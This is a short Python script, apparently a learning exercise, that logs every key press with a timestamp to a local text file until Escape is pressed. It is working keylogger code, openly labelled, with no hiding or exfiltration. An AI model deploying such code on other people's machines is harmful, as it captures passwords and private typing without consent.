'''
Resources:
https://www.w3schools.com/python/python_datetime.asp
https://www.geeksforgeeks.org/how-to-detect-if-a-specific-key-pressed-using-python/
https://www.w3schools.com/python/python_file_write.asp
'''

import keyboard
import datetime

def keylogger():
    while True: # continues the loop until the escape key is pressed
        file = open("output.txt", "a") # should open and close it on every key press in order for the txt file to update while the program is still running
        key_press = keyboard.read_event()  # get the key object
        
        if key_press.name == "esc":
            file.close()
            break  # exit program if escape is pressed
        
        if key_press.event_type == keyboard.KEY_DOWN: # only track on key_down, otherwise will write to the file a million times
            file.write(f"[{datetime.datetime.now()}]: {key_press.name}\n")
            file.close()

keylogger()